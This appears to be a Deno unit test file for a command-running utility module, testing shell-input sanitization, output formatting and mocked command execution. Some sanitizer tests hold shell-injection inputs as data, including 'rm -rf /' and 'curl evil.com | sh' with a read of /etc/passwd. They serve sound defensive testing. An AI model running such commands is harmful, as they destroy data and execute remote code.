/**
 * @fileoverview Unit tests for utils.ts
 * @module utils_test
 */

import { assertEquals, assertRejects, assertStringIncludes } from "https://deno.land/std@0.208.0/assert/mod.ts";
import {
  formatCommandOutput,
  isCommandAvailable,
  runCommand,
  type RunCommandOptions,
  type RunCommandResult,
  runCommandSimple,
  sanitizeForShell,
} from "../src/utils/utils.ts";
import { NagareError } from "../src/core/enhanced-error.ts";

// =============================================================================
// sanitizeForShell Tests - These don't require actual command execution
// =============================================================================

Deno.test("sanitizeForShell - removes dangerous characters", () => {
  const input = "hello; rm -rf /; echo done";
  const result = sanitizeForShell(input);
  assertEquals(result, "hello rm -rf / echo done");
});

Deno.test("sanitizeForShell - removes pipe characters", () => {
  const input = "cat file | grep pattern";
  const result = sanitizeForShell(input);
  assertEquals(result, "cat file  grep pattern");
});

Deno.test("sanitizeForShell - removes ampersands", () => {
  const input = "command1 && command2 & background";
  const result = sanitizeForShell(input);
  assertEquals(result, "command1  command2  background");
});

Deno.test("sanitizeForShell - removes backticks", () => {
  const input = "echo `whoami`";
  const result = sanitizeForShell(input);
  assertEquals(result, "echo whoami");
});

Deno.test("sanitizeForShell - removes dollar signs", () => {
  const input = "echo $HOME ${PATH}";
  const result = sanitizeForShell(input);
  assertEquals(result, "echo HOME {PATH}");
});

Deno.test("sanitizeForShell - removes parentheses", () => {
  const input = "$(command) (subshell)";
  const result = sanitizeForShell(input);
  assertEquals(result, "command subshell");
});

Deno.test("sanitizeForShell - removes angle brackets", () => {
  const input = "cat < input.txt > output.txt";
  const result = sanitizeForShell(input);
  assertEquals(result, "cat  input.txt  output.txt");
});

Deno.test("sanitizeForShell - removes backslashes", () => {
  const input = "path\\to\\file";
  const result = sanitizeForShell(input);
  assertEquals(result, "pathtofile");
});

Deno.test("sanitizeForShell - handles safe strings", () => {
  const input = "hello world 123 test-file_name.txt";
  const result = sanitizeForShell(input);
  assertEquals(result, "hello world 123 test-file_name.txt");
});

Deno.test("sanitizeForShell - handles empty string", () => {
  const result = sanitizeForShell("");
  assertEquals(result, "");
});

Deno.test("sanitizeForShell - handles complex injection attempt", () => {
  const input = "; rm -rf / && curl evil.com | sh < /etc/passwd > /tmp/out & $(evil) `malicious` $PATH \\escape";
  const result = sanitizeForShell(input);
  // All dangerous characters should be removed
  assertEquals(result.includes(";"), false);
  assertEquals(result.includes("&"), false);
  assertEquals(result.includes("|"), false);
  assertEquals(result.includes("`"), false);
  assertEquals(result.includes("$"), false);
  assertEquals(result.includes("("), false);
  assertEquals(result.includes(")"), false);
  assertEquals(result.includes("<"), false);
  assertEquals(result.includes(">"), false);
  assertEquals(result.includes("\\"), false);
});

// =============================================================================
// formatCommandOutput Tests - Pure string manipulation
// =============================================================================

Deno.test("formatCommandOutput - removes trailing whitespace", () => {
  const input = "line1   \nline2  \nline3    ";
  const result = formatCommandOutput(input);
  assertEquals(result, "line1\nline2\nline3");
});

Deno.test("formatCommandOutput - removes leading/trailing empty lines", () => {
  const input = "\n\nline1\nline2\n\n";
  const result = formatCommandOutput(input);
  assertEquals(result, "line1\nline2");
});

Deno.test("formatCommandOutput - preserves single empty lines between content", () => {
  const input = "line1\n\nline2\n\nline3";
  const result = formatCommandOutput(input);
  assertEquals(result, "line1\n\nline2\n\nline3");
});

Deno.test("formatCommandOutput - removes multiple consecutive empty lines", () => {
  const input = "line1\n\n\n\nline2";
  const result = formatCommandOutput(input);
  assertEquals(result, "line1\n\nline2");
});

Deno.test("formatCommandOutput - handles single line", () => {
  const input = "  single line  ";
  const result = formatCommandOutput(input);
  assertEquals(result, "single line");
});

Deno.test("formatCommandOutput - handles empty input", () => {
  const result = formatCommandOutput("");
  assertEquals(result, "");
});

Deno.test("formatCommandOutput - handles only whitespace", () => {
  const input = "   \n  \n   ";
  const result = formatCommandOutput(input);
  assertEquals(result, "");
});

Deno.test("formatCommandOutput - removes indentation from start", () => {
  // Note: formatCommandOutput calls .trim() at the end which removes leading spaces
  const input = "  indented line\n    more indented";
  const result = formatCommandOutput(input);
  assertEquals(result, "indented line\n    more indented");
});

Deno.test("formatCommandOutput - handles regular line endings", () => {
  const input = "line1\nline2\n\nline3\n";
  const result = formatCommandOutput(input);
  assertEquals(result, "line1\nline2\n\nline3");
});

Deno.test("formatCommandOutput - removes carriage returns", () => {
  // Note: formatCommandOutput's trim() removes \r characters
  const input = "line1\r\nline2\r\n";
  const result = formatCommandOutput(input);
  // The function removes \r characters
  assertEquals(result.includes("\r"), false);
  assertEquals(result, "line1\nline2");
});

// =============================================================================
// Mock-based tests for command execution
// =============================================================================

Deno.test("runCommand - handles command execution (mocked)", async () => {
  // Mock Deno.Command for testing
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {}

    output = async () => ({
      success: true,
      code: 0,
      stdout: new TextEncoder().encode("mocked output"),
      stderr: new Uint8Array(),
    });
  };

  try {
    const result = await runCommand("test", ["arg1", "arg2"]);
    assertEquals(result.success, true);
    assertEquals(result.code, 0);
    assertEquals(result.stdout, "mocked output");
    assertEquals(result.stderr, "");
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

Deno.test("runCommand - handles command failure (mocked)", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {}

    output = async () => ({
      success: false,
      code: 1,
      stdout: new Uint8Array(),
      stderr: new TextEncoder().encode("error message"),
    });
  };

  try {
    const result = await runCommand("test", [], { throwOnError: false });
    assertEquals(result.success, false);
    assertEquals(result.code, 1);
    assertEquals(result.stderr, "error message");
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

Deno.test("runCommand - throws on error when configured (mocked)", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {}

    output = async () => ({
      success: false,
      code: 42,
      stdout: new Uint8Array(),
      stderr: new TextEncoder().encode("command failed"),
    });
  };

  try {
    await assertRejects(
      async () => {
        await runCommand("test", [], { throwOnError: true });
      },
      NagareError,
      "Command failed",
    );
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

Deno.test("runCommand - handles command not found (mocked)", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {
      throw new Error("Command not found");
    }

    output = async () => {
      throw new Error("Should not reach here");
    };
  };

  try {
    await assertRejects(
      async () => {
        await runCommand("nonexistent", []);
      },
      NagareError,
      "Failed to execute command",
    );
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

// =============================================================================
// runCommandSimple Tests
// =============================================================================

Deno.test("runCommandSimple - returns stdout (mocked)", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {}

    output = async () => ({
      success: true,
      code: 0,
      stdout: new TextEncoder().encode("simple output"),
      stderr: new Uint8Array(),
    });
  };

  try {
    const result = await runCommandSimple("test", []);
    assertEquals(result, "simple output");
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

Deno.test("runCommandSimple - throws on error (mocked)", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {}

    output = async () => ({
      success: false,
      code: 1,
      stdout: new Uint8Array(),
      stderr: new TextEncoder().encode("error"),
    });
  };

  try {
    await assertRejects(
      async () => {
        await runCommandSimple("test", []);
      },
      NagareError,
    );
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

// =============================================================================
// isCommandAvailable Tests
// =============================================================================

Deno.test("isCommandAvailable - detects available command (mocked)", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {}

    output = async () => ({
      success: true,
      code: 0,
      stdout: new TextEncoder().encode("/usr/bin/test"),
      stderr: new Uint8Array(),
    });
  };

  try {
    const result = await isCommandAvailable("test");
    assertEquals(result, true);
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

Deno.test("isCommandAvailable - detects unavailable command (mocked)", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(public cmd: string, public options?: any) {}

    output = async () => ({
      success: false,
      code: 1,
      stdout: new Uint8Array(),
      stderr: new TextEncoder().encode("command not found"),
    });
  };

  try {
    const result = await isCommandAvailable("nonexistent");
    assertEquals(result, false);
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

Deno.test("isCommandAvailable - uses correct command for current OS", async () => {
  const originalCommand = Deno.Command;

  let capturedCommand = "";

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(cmd: string, _options?: any) {
      capturedCommand = cmd;
    }

    output = async () => ({
      success: true,
      code: 0,
      stdout: new Uint8Array(),
      stderr: new Uint8Array(),
    });
  };

  try {
    await isCommandAvailable("test");

    // Check that the right command was used based on the current OS
    if (Deno.build.os === "windows") {
      assertEquals(capturedCommand, "where");
    } else {
      assertEquals(capturedCommand, "which");
    }
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

Deno.test("isCommandAvailable - handles errors gracefully", async () => {
  const originalCommand = Deno.Command;

  // deno-lint-ignore no-explicit-any
  (Deno as any).Command = class MockCommand {
    constructor(_cmd: string, _options?: any) {
      throw new Error("System error");
    }

    output = async () => {
      throw new Error("Should not reach here");
    };
  };

  try {
    const result = await isCommandAvailable("test");
    assertEquals(result, false);
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});

// =============================================================================
// Edge Cases and Integration Tests
// =============================================================================

Deno.test("formatCommandOutput - handles very long strings", () => {
  const longLine = "x".repeat(10000);
  const input = `${longLine}\n\n${longLine}`;
  const result = formatCommandOutput(input);
  assertEquals(result, `${longLine}\n\n${longLine}`);
});

Deno.test("sanitizeForShell - performance with long strings", () => {
  const longString = "safe_string_".repeat(1000) + "; dangerous && command";
  const result = sanitizeForShell(longString);
  assertEquals(result.includes(";"), false);
  assertEquals(result.includes("&"), false);
  assertEquals(result.startsWith("safe_string_"), true);
});

Deno.test("runCommand - passes options correctly (mocked)", async () => {
  const originalCommand = Deno.Command;

  try {
    let capturedCmd = "";
    let capturedOptions: any = {};

    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = class MockCommand {
      constructor(cmd: string, options?: any) {
        capturedCmd = cmd;
        capturedOptions = options || {};
      }

      output = async () => ({
        success: true,
        code: 0,
        stdout: new TextEncoder().encode("test output"),
        stderr: new Uint8Array(),
      });
    };

    const result = await runCommand("test-cmd", ["arg1", "arg2"], {
      cwd: "/custom/path",
      stdout: true,
      stderr: true,
    });

    assertEquals(result.success, true);
    assertEquals(result.stdout, "test output");
    assertEquals(capturedCmd, "test-cmd");
    assertEquals(capturedOptions.args, ["arg1", "arg2"]);
    assertEquals(capturedOptions.cwd, "/custom/path");
    assertEquals(capturedOptions.stdout, "piped");
    assertEquals(capturedOptions.stderr, "piped");
  } finally {
    // deno-lint-ignore no-explicit-any
    (Deno as any).Command = originalCommand;
  }
});
